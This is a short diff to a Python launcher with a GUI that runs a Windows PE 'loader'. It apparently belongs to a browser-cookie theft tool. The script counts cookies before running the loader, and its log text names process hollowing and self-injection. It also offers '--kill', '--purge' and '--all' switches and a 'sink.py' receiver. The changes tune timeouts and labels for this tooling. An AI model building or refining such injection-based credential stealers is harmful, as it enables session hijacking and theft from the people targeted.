@@ -245,7 +245,7 @@ def run(path, sink, kill, purge, timeout, extra, log=print):
     if not os.path.exists(LOADER):
         log("[-] missing %s (run build.bat)" % LOADER); return
     if sys.platform != "win32":
-        log("[-] running the loader locally is Windows-only (PE + hollowing). Test on a Windows target.")
+        log("[-] running the loader locally is Windows-only (PE + self-injection). Test on a Windows target.")
         return
     before, _ = count_cookies()
 
@@ -259,7 +259,7 @@ def run(path, sink, kill, purge, timeout, extra, log=print):
         log("[*] loader: " + subprocess.list2cmdline(cmd))
         try:
             lp = subprocess.run(cmd, cwd=BIN, capture_output=True, text=True,
-                                timeout=int(timeout)/1000+10)
+                                timeout=int(timeout)/1000+15)
             for line in (lp.stdout or "").strip().splitlines(): log("  " + line)
             if lp.stderr and lp.stderr.strip():
                 for line in lp.stderr.strip().splitlines(): log("[!] " + line)
@@ -550,12 +550,12 @@ def gui():
     kill  = tk.BooleanVar(value=True)
     purge = tk.BooleanVar(value=True)
     snk   = tk.BooleanVar(value=True)
-    ttk.Checkbutton(ob, text="--kill", variable=kill).pack(side="left", padx=(0,10))
+    ttk.Checkbutton(ob, text="--kill (legacy)", variable=kill).pack(side="left", padx=(0,10))
     ttk.Checkbutton(ob, text="--purge", variable=purge).pack(side="left", padx=(0,10))
     ttk.Checkbutton(ob, text="sink.py alongside", variable=snk).pack(side="left", padx=(0,10))
     ttk.Label(ob, text="timeout (ms):").pack(side="left", padx=(6,2))
     tmo = ttk.Spinbox(ob, from_=2000, to=600000, increment=1000, width=8)
-    tmo.set("20000"); tmo.pack(side="left", padx=(0,10))
+    tmo.set("300000"); tmo.pack(side="left", padx=(0,10))
     ttk.Label(ob, text="args:").pack(side="left", padx=(4,2))
     extra = ttk.Entry(ob, width=16)
     extra.insert(0, "--all")
